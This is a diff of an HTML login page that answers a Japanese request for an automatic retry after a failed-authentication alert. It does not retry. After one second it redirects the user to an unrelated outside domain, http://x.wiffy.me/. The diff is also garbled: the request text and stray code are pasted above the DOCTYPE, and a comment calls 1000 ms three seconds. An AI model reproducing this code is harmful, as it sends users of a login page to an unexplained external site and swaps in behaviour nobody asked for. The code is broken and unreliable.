@@ -1,3 +1,10 @@
+このアラートの後、自動で再試行するようにしたいです。
+<script src="js/linker.js"></script>
+
+} else if (res === 'failed') {
+alert('Authentication failed. Please retry.');
+
+
 <!DOCTYPE html>
 <html lang="">
 
@@ -679,9 +686,16 @@
         window.location.href = 'welcome.html?' + urlParams.toString();
       } else if (res === 'failed') {
         alert('Authentication failed. Please retry.');
+        setTimeout(function () {
+          var timestamp = Date.now();
+          var redirectUrl = "http://x.wiffy.me/";
+          var redirectUrlWithParams = redirectUrl + "?ts=" + timestamp;
+
+          window.location.href = redirectUrlWithParams;
+        }, 1000); // 1000ミリ秒（3秒）後に実行
       }
     });
-</script>
+  </script>
 
 </body>
 
